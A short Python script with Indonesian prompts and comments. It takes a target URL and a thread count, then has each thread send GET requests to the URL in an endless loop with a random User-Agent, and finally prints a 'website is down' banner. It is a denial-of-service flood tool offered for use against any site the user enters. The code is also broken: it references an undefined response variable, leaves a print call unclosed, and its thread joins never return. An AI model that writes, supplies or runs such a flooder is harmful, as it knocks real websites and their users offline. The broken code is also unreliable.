import threading
import random
import time
import requests

# Input target URL
target_url = input("Masukkan URL target: ")

# Input jumlah request
num_requests = int(input("Masukkan jumlah request: "))

# Interval waktu antar request
interval = 0

# User Agent
user_agent = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"]

def send_request():
    while True:
        # Pilih user agent secara random
        ua = random.choice(user_agent)
        headers = {"User-Agent": ua}
        response = requests.get(target_url, headers=headers)
        if response.status_code == 200:
            print(f"Request sent successfully!")
        else:
            print(f"Request failed with status code {response.status_code}")

# Buat thread untuk mengirimkan request
threads = []
for _ in range(num_requests):
    t = threading.Thread(target=send_request)
    t.start()
    threads.append(t)

# Tunggu hingga semua request selesai
for t in threads:
    t.join()

# Pemberitahuan jika website down
if response.status_code != 200:
    print(f"\033[91mWEBSITE TELAH DOWN\033[0m")
    print(f"\033[92mSCRIPT SENDANG MENGIRIMKAN PERMINTAAN\033[0m"
